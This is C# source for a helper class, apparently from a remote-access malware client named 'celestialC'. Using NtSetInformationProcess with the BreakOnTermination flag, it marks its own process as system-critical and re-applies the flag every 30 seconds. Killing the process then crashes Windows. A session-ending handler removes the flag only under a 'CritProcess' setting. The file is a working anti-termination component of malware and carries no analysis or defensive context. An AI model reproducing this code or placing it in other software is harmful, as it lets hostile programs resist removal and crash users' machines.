using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using celestialC.Native;
using System.Threading.Tasks;

namespace celestialC.Helper
{
    public static class ProcessCritical
    {
        static int isCritical = 1;
        static int isntcritical = 0;
        static int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
        public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            if (Convert.ToBoolean(Settings.CritProcess) && Methods.IsAdmin())
                Exit();
        }
        public static void Set()
        {
            if (Methods.IsAdmin())
            {
                Thread PollThread = new Thread(() =>
                {
                    while (true)
                    {
                        try
                        {
                            SystemEvents.SessionEnding += new SessionEndingEventHandler(SystemEvents_SessionEnding);
                            Process.EnterDebugMode();
                            NativeMethods.NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                        }
                        catch
                        { }
                        Thread.Sleep(30000);
                    }
                });
                PollThread.IsBackground = true;
                PollThread.Start();
            }
        }
        public static void Exit()
        {
            try
            {
                NativeMethods.NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isntcritical, sizeof(int));
            }
            catch
            {
                while (true)
                {
                    Thread.Sleep(100000); //prevents a BSOD on exit failure
                }
            }
        }
    }
}
